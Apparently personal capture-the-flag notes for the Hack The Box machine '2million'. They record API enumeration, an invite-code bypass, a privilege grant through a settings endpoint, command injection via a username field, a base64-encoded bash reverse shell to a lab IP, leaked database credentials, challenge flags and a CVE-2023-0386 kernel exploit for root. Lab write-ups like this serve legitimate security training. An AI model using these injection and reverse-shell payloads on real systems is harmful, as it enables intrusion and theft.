IP: 10.10.11.221
OS: 

==SCAN==
```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

==INTERESTING ROUTES==
```
/api/v1/
/register.php
/login.php
/js/inviteapi.min.js
```

==DATA==
Inside of `/js/inviteapi.min.js`  I found this:
![[Pasted image 20251208222048.png]]
- `/api/v1/invite/verify`
- `/api/v1/invite/how/to/generate/verify`

Making a POST request in `/api/v1/invite/how/to/generate` i found this:
```
{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."
```
![[Pasted image 20251208223139.png]]

Is encoded in ROT13, decoded:
`In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`

Making this request we getting: 
`{"0":200,"success":1,"data":{"code":"OVNXSk0tOEVRUjktVDNOVFUtTFlJS0M=","format":"encoded"}}`
![[Pasted image 20251208223500.png]]
Is encoded in Base64:
`9SWJM-8EQR9-T3NTU-LYIKC`

Register with this code and login

Inside of `/home/access` we can download an .ovpn file but this don't have nothing interesting, just a little info for the path of api:
`/api/v1/user`
here we get: 
```
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}

```

We can update our permissions in `/api/v1/admin/settings/update` making a PUT request:
![[Pasted image 20251209014433.png]]

Setting this content in the request we can get admin permissions
```
curl -X PUT http://2million.htb/api/v1/admin/settings/update --cookie "PHPSESSID=3nn4cu6578cfq08vr8io83r012" --header "Content-Type: application/json" --data '{"email":"pach@pach.com", "is_admin":1}'
```

Now we are admin, so we can try the endpoint `/api/v1/admin/vpn/generate` with admin permissions

```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=3nn4cu6578cfq08vr8io83r012" --header "Content-Type: application/json" --data '{"username":"test;id;"}'


uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Getting RevShell:
```
curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=3nn4cu6578cfq08vr8io83r012" --header "Content-Type: application/json" --data '{"username":"test;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41My85MDAxIDA+JjE= | base64 -d | bash;"}'
```

Inside of `/var/www/html/.env` we get:
```
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Cat `user.txt`
`974bc54ae382cdd076d1fb3f81f9e870`

==PRIVILEGE SCALATION==

Running `./linpeas.sh` I found:
`You can write SUID file: /tmp/CVE-2023-0386-main/ovlcap/upper/file`

So inside of this directory we can exploit `CVE-2023-0386` by this way:

Inside of `CVE-2023-0386-main`: make all

Terminal 1: `./fuse .ovlcap/lower ./gc`
Terminal 2: `./exp`

`4c3a1841a58d74597bc79c2338ce12fb`

https://github.com/puckiestyle/CVE-2023-0386